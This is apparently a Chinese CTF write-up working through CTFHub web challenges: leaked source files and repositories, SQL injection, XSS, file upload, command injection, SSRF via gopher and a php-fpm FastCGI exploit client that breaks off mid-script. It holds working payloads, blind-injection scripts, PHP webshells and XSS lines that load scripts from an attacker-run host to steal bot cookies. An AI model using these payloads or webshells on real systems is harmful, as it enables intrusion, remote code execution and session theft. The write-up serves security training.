这里是bak文件泄露，直接访问index.php.bak即可 vim缓存 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。 vim 交换文件名 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例：第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.php.swo 的交换文件 第三次产生的交换文件则为 .index.php.swn 根据上述提示我们访问.index.php.swp得到源码 .DS_Store .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 直接访问/.DS_Store访问得到下载文件，不过内容肉眼难辨，需要工具 这里我们用到了 Python-dsstore 这个工具 (https://github.com/gehaxelt/Python-dsstore) 来完成 .DS_Store 文件的解析： 访问即可 Git泄露 Git-Log 题目描述：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题 直接上工具。 克隆好源代码之后，git log查看历史记录 发现flag，当前所处的版本为 remove flag，flag 在 add flag 这次提交中 解法一： 直接与 add flag (95819c) 这次提交进行比对 git diff 3e25d # 或者 git diff HEAD^ 解法二： 直接切换到 add flag (3e25d) 这个版本 git reset --hard 3e25d # 或 git reset --hard HEAD^ Git-Stash 考点 git 泄露 .git/refs/stash stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。 git stash lish #查看当前stash中的内容 git stash pop #将当前stash中的内容弹出，并应用到当前分支对应的工作目录上,可以理解为恢复内容。 克隆好源码之后： 解法一： 执行 git stash list 发现有 stash 执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag 解法二： 如果你使用的 GitHack 工具执行完 git stash show 之后没有显示 stash 记录，那么不妨来尝试这个方法 查看 .git/refs/stash 找到 stash 对应的 hash git diff 25bfc 即可看到 flag–但我这里没有显示，可能是环境没了的问题 Git-Index 题目中的index并不是我们理解的web网页，而是一个暂存区，默认存储在.git/index。 关于index的具体知识点大家可以阅读一下这个文章：(Git本地库中的索引（Index）及文件状态概述_易生一世的博客-CSDN博客 git checkout-index命令 将Index中列表的文件检出到工作目录，默认不覆盖已有文件。 -u, --index，更新所有检出的文件的stat信息（git status） -a, --all，检出Index中列表的所有文件 -f, --force，检出时覆盖已有文件 -n, --no-create，只再次检出工作目录中已有的文件（不创建任何新文件） --，禁用任何参数 这里我是直接读取index目录，结果看到当前目录下多了个txt文件，直接读取得到flag SVN泄露 当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。 如果访问url/.svn/entries有反应的话，就存在svn泄露。直接上工具利用：https://github.com/kost/dvcs-ripper --最好在kali安装 安装教程参考：ctfhub–svn泄露 安装好输入以下命令 ./rip-svn.pl -v -u url 这里必须要ls -al才能看到恢复的.svn文件，之后tree .svn查看文件目录结构 flag在此目录下，读取即可 HG泄露 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。 工具依旧是上述的 这里测试了半天，以为能在此直接读到flag的，结果看了wp发现直接访问就行。。。实在是没想到 或者如果这里删掉了该文件，我们可以尝试读取历史文件：路径是 .hg/store/data/flag__2096222060.txt.i 注意下划线是两个 当然也可以直接curl访问 密码口令 弱口令 通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 这里尝试了几下，admin+123456即可 默认口令 题目说了是默认口令，我们可以谷歌关键词搜索一手 这里也是顺利的在wooyun看了到公开的漏洞，我们尝试一下上述三个账号，第二个是成功的，如下图 SQL注入 整数型注入 判断是否存在注入点： ?id=1 and 1=1 ?id=1 and 1=2 可以发现页面回显不一样。说明是数字型，直接开始注入即可。这里判断字段数是2 爆库：?id=-1 union select 1,database() 爆表名：?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 爆列名：?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag' 爆数据：?id=-1 union select 1,flag from flag 当然sqlmap就更简单了 字符型注入 很简单，只不过需要引号闭合一下，后面用–+注释掉即可，不赘述了 ?id=-1' union select 1,flag from flag--+ 报错注入 简单的报错注入，不需要闭合，直接上payload即可 ?id=1 and updatexml(1,concat(0x7e,database()),1) 得到flag：?id=1 and updatexml(1,concat(0x7e,select flag from flag),1) 不过报错显示的字符有限，我们爆出后半部分即可 ?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),15,40)),1) 完整：ctfhub{51f61213dc2a24ab5fc09fc7} 布尔盲注 ?id=1 and 1=1 ?id=1 and 1=2 如上，页面只有两种回显，只能盲注，写脚本，二分法更快。或者sqlmap import time import requests url = 'http://challenge-f1141910229dba2a.sandbox.ctfhub.com:10800/?id=' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1 and if(ascii(substr((select flag from flag),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 print(mid) flag += chr(mid) print(flag) 时间盲注 ?id=1 and sleep(1) ?id=1 and sleep(5) 简单测试一下发现页面回显有所延迟，确定为时间盲注。上脚本或者，sqlmap import time import requests url = 'http://challenge-3252dd76021b94e3.sandbox.ctfhub.com:10800/?id=' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1 and if(ascii(substr((select flag from flag),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 #print(mid) flag += chr(mid) print(\"flag:\", flag) MySQL结构 这道题也不知道什么含义，考点和整数型注入似乎是一样的，只不过换了些名字，过程不赘述了，直接给结果 ?id=-1 union select 1,oifqtgzzzi from cjpyvsldua Cookie注入 提示我们在cookie处 如上图，成功爆库，接下来爆表 id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 爆列名 id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='asdlhojeyd' 爆数据 id=-1 union select 1,tbslnjukkx from asdlhojeyd UA注入 看数据就知道注入点在UA头处，直接修改即可，步骤同上，不再赘述 Referer注入 直接在referer头处输入SQL语句即可，不再赘述 过滤空格 题目说了过滤空格，直接采用%0a或者内联注释符绕过即可 ?id=-1/**/union/**/select/**/1,zfbvfsfjmz/**/from/**/lyvloeyoue XSS XSS-反射型 题目说是反射型，我们先简单测试一下 的确存在，而且没有过滤，那我们分析一下下面的Bot的含义，我们都知道如果网站存在xss的话，其危害通常来说就是获取其他用户甚至是管理员的cookie，密码等等信息，那我们输入恶意xss代码，肯定需要有人去访问或者点击，这样的话我们才能获得他们cookie等信息，而下面的Bot就是存在一个机器人去模仿别的用户或者管理员去点击我们的恶意xss代码，从而我们可以得到其cookie。 那接下来就需要我们的xssplatform了，毕竟bot点击之后只会显示success，其cookie我们无法得知，需要通过xss平台来获取cookie。建议是自己用vps搭一个平台，这里我已经搭建好，随后建一个项目，配置默认即可。 随便复制一个，先提交至上面的输入框 接下来将得到的url传到下面的bot让其自动点击 页面显示success之后我们到xss后台就可以看到cookie信息了 XSS-存储型 这里同样将上述的xss代码传入上面的输入框，传入之后这个恶意代码就被存入了对方的（受害者）服务器中，随后将靶场地址输入到下面的bot中，其后每当bot访问该网址，就相当于执行一次我们恶意代码，我们只需要在xss平台就可以获得cookie XSS-DOM反射 DOM反射说白了，就是审计前端的js代码，这种xss是反射型的变种，他不需要去服务器端进行交互，直接就在前端将插入的js代码渲染了，也就是这完全是客户端的事情。 所以遇到这种反射，我们通常需要考虑如何闭合其代码，从而将我们的恶意js代码得到执行 这里我们简单测试发现我们输入的内容插入到了这个innerHTML中，但由于其被当成了字符串，所以这个恶意js代码无法执行，因此我们需要考虑闭合。倘若我们构造下列payload： ';&lt;/script&gt;&lt;script&gt;alert('hacker')&lt;/script&gt;// //这样的话我们就将前面的script标签进行了闭合,后续通过//进行注释,我们的js代码得以成功执行 //接下来将上列payload替换为我们xss平台的代码即可,最后将得到的url提交给bot让其点击,观察平台响应即可 成功拿到flag XSS-DOM跳转 这里也是有点蒙蔽，就看wp了 &lt;script&gt; //获取了当前页面的URL查询部分（即location.search） var target = location.search.split(\"=\") //然后使用split(\"=\")方法将查询参数分割成数组。这将导致target变量包含一个数组，其中第一个元素是查询参数名，第二个元素是查询参数值。 //它检查数组的第一个元素的剥离后是否等于字符串\"jumpto\" //slice(1)是用来去掉参数名前面的问号字符(\"?\")的 if (target[0].slice(1) == \"jumpto\") { //将页面的location.href属性设置为查询参数的值，从而导致页面重定向到该值所指定的URL。 location.href = target[1]; } &lt;/script&gt; 这里是漏洞点，可见这里我们需要get传一个jumpto的参数，并在=后面附上我们的恶意js代码，但此处我并不清楚如何添加，看了wp发现是知识盲区： 注意！当你将类似于 location.href = “javascript:alert(‘xss’)” 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。 所以有如下payload： http://challenge-a0657aa32a9d9134.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(\"//ip:9999//9GXMk4\") 这段代码使用了 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。 拿到flag XSS-过滤空格 简单测试一下知道过滤了空格，查询一番可以知道通过/**/或者/符号即可绕过，原始payload如下： &lt;/textarea&gt;'\"&gt;&lt;script src=http://ip:9999/9GXMk4&gt;&lt;/script&gt; 修改如下： &lt;/textarea&gt;'\"&gt;&lt;script/src=http://ip:9999/9GXMk4&gt;&lt;/script&gt; 之后老办法即可 XSS-过滤关键词 简单测试知道过滤了script关键词，尝试双写成功绕过。 &lt;/textarea&gt;'\"&gt;&lt;scriscriptpt/src=http://ip:9999/9GXMk4&gt;&lt;/scriscriptpt&gt; 文件上传 无验证 题目说没有过滤，直接传入一句话上传即可，如下图，文件上传路径也得知了，直接访问。 1=system('cat /var/www/html/flag_1916225392.php'); 前端验证 这里上传php后缀文件会发现被前端的js禁止了，那我们修改后缀为其指定的，随后抓包修改即可 成功上传 1=system('cat /var/www/html/flag_985418763.php'); .htaccess htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 如果我们用上一关的思路会发现行不通，其在后端进行了后缀名的验证 if (!empty($_POST['submit'])) { $name = basename($_FILES['file']['name']); $ext = pathinfo($name)['extension']; $blacklist = array(\"php\", \"php7\", \"php5\", \"php4\", \"php3\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\"); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) { echo \"&lt;script&gt;alert('上传成功')&lt;/script&gt;\"; echo \"上传文件相对路径&lt;br&gt;\" . UPLOAD_URL_PATH . $name; } else { echo \"&lt;script&gt;alert('上传失败')&lt;/script&gt;\"; } } else { echo \"&lt;script&gt;alert('文件类型不匹配')&lt;/script&gt;\"; } } 我们可以看到上述过滤的后缀很多，但是没有过滤.htaccess，那我们上传即可，内容如下 AddType application/x-httpd-php .bcx 这意味着如果我们上传后缀名为.bcx的文件，其服务器会将其内容按照php解析。 1=system('cat /var/www/html/flag_2427815270.php'); MIME绕过 这里进行了MIME类型的检测 我们直接修改Content-Type即可 1=system('cat /var/www/html/flag_324517797.php'); 文件头检查 这里限制了文件头也就是不能&lt;?php开头了，那我们以GIF89a开头即可 1=system('cat /var/www/html/flag_31822842.php'); 00截断 这里题目说是利用00截断，原理就是空字符在C语言中会被当做字符串结束的标志，而php底层是C实现的，那也就是说php也可以用00来代表截断，不过此方法有PHP版本限制 我们随便上传个文件抓包可以看到如下图，这里增加了一个参数导致我们可以随意控制文件上传路径，那我们直接在路径后面做出如下修改 这里注意空字符用%00代替，随后直接上传即可，这里如果我们的文件名为1.jpg之类的，那上传后为shell.php%001.jpg这里上传至服务器之后，它会将后面的1.jpg忽略，从而我们可以绕过。 双写后缀 这里上传看了一下发现后缀php被替换为空了，但下面给了我们提示代码 $name = basename($_FILES['file']['name']); $blacklist = array(\"php\", \"php5\", \"php4\", \"php3\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\", \"ini\"); $name = str_ireplace($blacklist, \"\", $name); 这里将黑名单中的替换为空，和明显可以双写绕过 RCE eval()执行 &lt;?php if (isset($_REQUEST['cmd'])) { eval($_REQUEST[\"cmd\"]); } else { highlight_file(__FILE__); } ?&gt; 没有任何过滤 最后cat读取即可 文件包含 &lt;?php error_reporting(0); if (isset($_GET['file'])) { if (!strpos($_GET[\"file\"], \"flag\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else { highlight_file(__FILE__); } ?&gt; &lt;hr&gt; i have a &lt;a href=\"shell.txt\"&gt;shell&lt;/a&gt;, how to use it ? i have a shell, how to use it ? 这里限制了flag的出现，strpos是用于寻找file参数中是否存在flag敏感字符。 那我们传入一句话即可，这里用他提供的shell.txt了，因为include会执行传入的文件中的php代码 最后读取即可 php://input 使用题目描述的php伪协议的前提就是，下面的include那个参数为on 接着我们构造payload即可 远程包含 &lt;?php error_reporting(0); if (isset($_GET['file'])) { if (!strpos($_GET[\"file\"], \"flag\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else { highlight_file(__FILE__); } ?&gt; &lt;hr&gt; i don't have shell, how to get flag?&lt;br&gt; &lt;a href=\"phpinfo.php\"&gt;phpinfo&lt;/a&gt; i don't have shell, how to get flag? phpinfo 我们看到值为on可以进行远程文件包含，我们直接将其包含我们vps上的恶意文件即可注意恶意文件的后缀不可为php 或者采用上一关的php://input也可 读取源代码 直接php伪协议读取即可 命令注入 &lt;?php $res = FALSE; if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $cmd = \"ping -c 4 {$_GET['ip']}\"; exec($cmd, $res); } ?&gt; &lt;?php if ($res) { print_r($res); } ?&gt; &lt;?php show_source(__FILE__); ?&gt; ip=127.0.0.1|ls ip=127.0.0.1|cat 3475247317307.php 过滤cat ?ip=127.0.0.1|tac flag_232592471929828.php|base64 解密即可 过滤空格 ?ip=127.0.0.1|tac${IFS}flag_15920651517426.php &lt; 、&lt;&gt;、%20(space)、%09(tab)、\\$IFS\\$9、 \\${IFS}、$IFS 过滤目录分隔符 这里看到题目过滤了/符号，陷入知识盲区了，想着编码可以绕过，但没有效果，不知道为何。看了wp发现似乎是考察对于管道符的理解的，我们可以采用;符号 ;ls发现flag所在目录 那接下来我们这样构造 ?ip=;cd flag_is_here;ls cat读取即可 过滤运算符 这里看代码过滤了&amp;和/符号，我们直接用;即可 ?ip=;cat flag_146781707832397.php 综合过滤练习 &lt;?php $res = FALSE; if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } else { $res = $m; } } ?&gt; 这里过滤了|、&amp;、;、\\、cat、flag、ctfhub，这里可以采用%0a换行符或者%09Tab制表符绕过 在 Linux 中使用 Tab 键，可以实现命令补全、文件和目录名补全等。 ?ip=%0acd%09*here%0atac${IFS}fla''g_61041444712473.php SSRF 内网访问 这里直接按照如上访问即可得到 伪协议读取文件 采用file伪协议直接读取到 端口扫描 这里说是端口扫描且范围在8000-9000，那我们利用dict或者http协议即可 我们构造如上payload对8000位置进行爆破即可 共计完成后发现一个长度明显不同的 最后利用http协议访问该端口发现flag POST请求 这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 这题又是我的知识盲区，就跟着wp走了，思路如下。 一般遇到这种漏洞我们需要先利用简单的file、http、dict协议进行初步的判断，比如端口开放情况，其内网文件那些可读等等。那这里我们就先看看能否读取到127.0.0.1里面的文件 ?url=file:///var/www/html/index.php &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])){ header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; 再读flag.php &lt;?php error_reporting(0); if ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") { echo \"Just View From 127.0.0.1\"; return; } $flag=getenv(\"CTFHUB\"); $key = md5($flag); if (isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key) { echo $flag; exit; } ?&gt; &lt;form action=\"/flag.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"key\"&gt; &lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt; &lt;/form&gt; 这里说地址只能为127.0.0.1且如果我们传入正确的key即可获得flag（但必须是post传入key），并且提示我们访问flag.php即可得到key，如下图：key=fd2d96bb2014fc2e6989fca7ece45856 接下来就应该想着谁可以进行post传参，这里看了wp知道是gopher协议可以 gopher伪协议（curl支持gopher），发送GET或POST请求(需要配合http协议二次url编码上传)； 本题要用gopher发送POST请求，gopher的格式是gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接tcp流，本题默认伪gopher://127.0.0.1:80/_后接post请求 ，完整的gopher请求如下： POST /flag.php HTTP/1.1 Host: 127.0.0.1:80 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=fd2d96bb2014fc2e6989fca7ece45856 具体原理一会儿再说，然后我们将它进行url编码，进行编码时要注意： 问号（？）需要转码为URL编码，也就是%3f(本题不涉及这个问题) 回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a 在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束） import urllib.parse payload = \"\"\"POST /flag.php HTTP/1.1 Host: 127.0.0.1:80 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=b8241a456e991e16ea69f441fd0cb214 \"\"\" # 注意payload的最后一行是回车（空行），表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace('%0A', '%0D%0A') new2 = urllib.parse.quote(new) result = 'gopher://127.0.0.1:80/_' + new2 print(result) # 这里因为是GET请求所以要进行两次url编码 之后bp发送即可 这里在复现的时候遇到的问题也很多，在此梳理一下 第一个是关于gopher协议编码几次的问题： 这里好理解一点就是：比如我们想要利用gopher协议攻击一个服务器的内网，并且该服务器某处存在一个ssrf的漏洞，那我们肯定要在此处传入我们的gopher协议进行打击，但在此之前呢，该web端对于我们传入的参数（也就是gopher协议的内容）进行了多次请求（或者叫做处理），但这些请求对我们来说是多余不必要的，我们想要的是最后一次可以达到对内网服务的请求。 但再次之前服务器对该参数内容进行了多次处理：url解码，这可能会导致我们在最终攻击之前，其gopher协议里面的部分参数被解析为无效的字符之类的导致我们的攻击失败，因此我们需要进行足够次数的url编码，让其保证在最后一次对内网服务请求的时候在对我们的gopher内容进行最后一次url解码。–如果理解有误，勿喷~~ 那接下来让我们回顾一下上述代码，分析一下需要进行几次编码 &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])){ header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; 这里说是如果url参数不存在则进行302跳转，如果存在呢，则在正常进行curl的http请求，而这一处代码： curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); - 如果HTTP响应包含“Location:”重定向，那么这个选项允许cURL遵循至新的位置(重定向)。 那这里基本明确了，首先我们在url进行get传参的时候呢，该web服务器会自动对其中的内容进行一次编码，接着在index.php页面呢，进行了一次curl的http请求（而这个请求是我们想要的）这也就意味着我们需要进行两次编码， 但我看了几篇wp发现有的还进行了3次编码，这里我猜测因为他们在传参的时候首先是请求的index.php页面，之后再请求flag.php，但如果先请求index.php页面呢，这个http响应是包含location重定向的，这里与curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);配合会进行一次302重定向的请求，因此会增加一次url编码次数。 如果我们的请求直接是对flag.php进行的，那就只需要两次了 上传文件 index.php &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; flag.php &lt;?php error_reporting(0); if($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\"){ echo \"Just View From 127.0.0.1\"; return; } if(isset($_FILES[\"file\"]) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 0){ echo getenv(\"CTFHUB\"); exit; } ?&gt; Upload Webshell &lt;form action=\"/flag.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\"&gt; &lt;/form&gt; 这里检查是否有一个名为“file”的文件上传到了脚本，并且这个文件的大小大于0字节。换句话说，脚本期待接收到一个文件上传。 这里也是懵逼了，忘记是考察gopher协议了，我还以为有什么其他伪协议有可以上传文件之类的请求呢，但却忘记了本质都是post请求。依旧使用gopher即可 不过这里对我来说不知道如何构造文件上传包，因此看了wp发现恍然大悟，很佩服 这里我们访问指定页面会发现并没有提交按钮，但我们可以修改前端代码添加啊： 接下来我们抓一个文件上传的包即可 POST /flag.php HTTP/1.1 Host: challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800 Content-Length: 306 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1KSttxB6ZH3HWz2e User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary1KSttxB6ZH3HWz2e Content-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\" Content-Type: image/jpeg &lt;?php @eval($_POST[1]);?&gt; ------WebKitFormBoundary1KSttxB6ZH3HWz2e Content-Disposition: form-data; name=\"hybcx\" 提交 ------WebKitFormBoundary1KSttxB6ZH3HWz2e-- 用上述介绍的python代码对其进行二次url编码即可，建议上述payload的最后一行别去掉，这代表着http请求的结束标志 FastCGI协议 这道题我看着知识面挺广的，所以这里就直接跟着文章复现，具体的原理我另起一篇文章续写 这里我们在理解了原理之后直接上exp import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() 